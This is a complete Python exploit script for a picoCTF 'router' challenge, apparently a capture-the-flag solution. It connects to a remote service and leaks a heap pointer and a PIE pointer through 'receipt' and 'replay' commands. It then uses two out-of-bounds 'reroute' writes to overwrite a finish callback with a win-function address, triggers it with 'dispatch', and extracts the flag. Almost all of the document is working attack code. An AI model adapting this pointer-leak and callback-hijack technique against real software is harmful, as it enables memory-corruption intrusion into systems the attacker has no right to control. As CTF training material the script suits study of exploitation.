#!/usr/bin/env python3
import argparse
import re
import socket
import sys

FX_DRAW_OFF = 0x2260
WIN_OFF = 0x2460
ORD_OFF = 0x5080
ORD_STRIDE = 0x1038


def i32(x: int) -> int:
    x &= 0xFFFFFFFF
    return x if x < 0x80000000 else x - 0x100000000


class Tube:
    def __init__(self, sock: socket.socket):
        self.sock = sock
        self.buf = b""

    def recv_until(self, marker: bytes, timeout: float = 8.0) -> bytes:
        self.sock.settimeout(timeout)
        while marker not in self.buf:
            data = self.sock.recv(4096)
            if not data:
                break
            self.buf += data
        idx = self.buf.find(marker)
        if idx == -1:
            out = self.buf
            self.buf = b""
            return out
        out = self.buf[: idx + len(marker)]
        self.buf = self.buf[idx + len(marker) :]
        return out

    def sendline(self, line: str) -> None:
        self.sock.sendall(line.encode() + b"\n")


def find_order_on_row_zero(t: Tube) -> tuple[int, int]:
    for x in range(0, 64):
        t.sendline(f"add_order {x} 0")
        out = t.recv_until(b"router> ").decode("utf-8", "ignore")
        m = re.search(r"order #(\d+)", out)
        if m:
            return int(m.group(1)), x
    raise RuntimeError("could not find a valid add_order on row y=0")


def leak_hint(t: Tube, order_id: int) -> int:
    t.sendline(f"receipt {order_id}")
    out = t.recv_until(b"router> ").decode("utf-8", "ignore")
    m = re.search(r"hint=(0x[0-9a-fA-F]+)", out)
    if not m:
        raise RuntimeError(f"no hint leak in output:\n{out}")
    return int(m.group(1), 16)


def leak_renderer(t: Tube, order_id: int) -> int:
    t.sendline(f"replay {order_id}")
    out = t.recv_until(b"router> ").decode("utf-8", "ignore")
    m = re.search(r"renderer=(0x[0-9a-fA-F]+)", out)
    if not m:
        raise RuntimeError(f"no renderer leak in output:\n{out}")
    return int(m.group(1), 16)


def run_exploit(host: str, port: int) -> str:
    sock = socket.create_connection((host, port), timeout=8)
    t = Tube(sock)
    t.recv_until(b"router> ")

    # Step 1: create a valid order at y=0 so node_index = x.
    order_id, x0 = find_order_on_row_zero(t)

    # Step 2: leak heap and PIE pointers.
    hint = leak_hint(t, order_id)  # route ptr
    renderer = leak_renderer(t, order_id)  # fx_draw_basic ptr

    pie = renderer - FX_DRAW_OFF
    win = pie + WIN_OFF
    ord_base = pie + ORD_OFF + order_id * ORD_STRIDE
    route_base = hint + 0x18

    delta = ord_base - route_base
    if delta % 8 != 0:
        raise RuntimeError(f"stage1 index not aligned: delta={delta}")
    idx_ord_base = delta // 8

    low = i32(win)
    high = i32(win >> 32)

    # Stage 1:
    # OOB reroute write to ORD base; second dword lands on ORD[id].x.
    # This sets x = low32(win). id becomes old node_index (=x0).
    t.sendline(f"reroute {order_id} {idx_ord_base} {low}")
    t.recv_until(b"router> ")
    new_id = x0

    # Stage 2:
    # Overwrite route+0x430 (finish callback) using reroute idx=131.
    # qword = [low32=node_index][high32=new_cost] => full win ptr.
    t.sendline(f"reroute {new_id} 131 {high}")
    t.recv_until(b"router> ")

    # Trigger callback.
    t.sendline(f"dispatch {new_id}")
    out = t.recv_until(b"router> ", timeout=8).decode("utf-8", "ignore")

    m = re.search(r"(picoCTF\{[^}\n]+\})", out)
    if not m:
        raise RuntimeError(f"flag not found in dispatch output:\n{out}")
    return m.group(1)


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit picoCTF router challenge")
    parser.add_argument("--host", default="mysterious-sea.picoctf.net")
    parser.add_argument("--port", type=int, default=51369)
    args = parser.parse_args()

    try:
        flag = run_exploit(args.host, args.port)
        print(flag)
        return 0
    except Exception as exc:
        print(f"[!] exploit failed: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
